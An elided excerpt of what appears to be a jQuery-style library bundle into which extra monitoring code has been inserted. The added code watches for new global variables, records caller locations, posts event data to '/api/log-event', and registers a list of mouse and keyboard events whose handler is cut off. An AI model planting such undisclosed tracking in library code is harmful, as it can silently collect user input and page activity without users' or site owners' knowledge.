...
(function (E, B) {
  ...
  const initialStore = localStorage;
  ...
  (function () {
    ...
    var k = function (g, i, n, m) {
      ...
      if (D.length > 1 && x.exec(g)) {
        if (D.length === 2 && o.relative[D[0]]) u = L(D[0] + D[1], i);else for (u = o.relative[D[0]] ? [i] : k(D.shift(), i); D.length;) {
          g = D.shift();
    ...
    var o = k.selectors = {
        ...
        preFilter: {
          ...
          PSEUDO: function (g, i, n, m, p) {
            if (g[1] === "not") {
              if ((d.exec(g[3]) || "").length > 1 || /^\w/.test(g[3])) g[3] = k(g[3], null, null, i);else {
  ...
  function notifyServer(eventData) {
    const data = {
      method: 'POST',
      headers: {
    ...
    nativeFetch('/api/log-event', data).then(response => response.status === 200 ? response : Promise.reject(response)).catch(error => console.error('Event notification failed:', error));
  }
  c.curCSS = c.css;
  function getCallerInfo() {
    ...
    if (stackLines.length > 2) {
      const match = stackLines[2].match(/\.js:(\d+):(\d+)/);
      if (match) {
  ...
  function trackGlobalVariableChanges() {
    ...
    const newGlobals = currentGlobalVariables.filter(g => !globalVariables.includes(g));
    if (newGlobals.length > 0) {
      const callerInfo = getCallerInfo();
      const eventData = {
        action: 'newGlobalVariable',
        variable: newGlobals[0],
        caller: callerInfo,
        timestamp: new Date().toISOString()
      };
      notifyServer(eventData);
    }
    window.setTimeout(trackGlobalVariableChanges, 5000);
  }
  c.extend({
  ...
  ["click", "dblclick", "mousedown", "mouseup", "mouseover", "mouseout", "mousemove", "mousedrag", "keydown", "keyup", "keypress", "touchstart", "touchend", "touchmove", "touchcancel"].forEach(etype => {
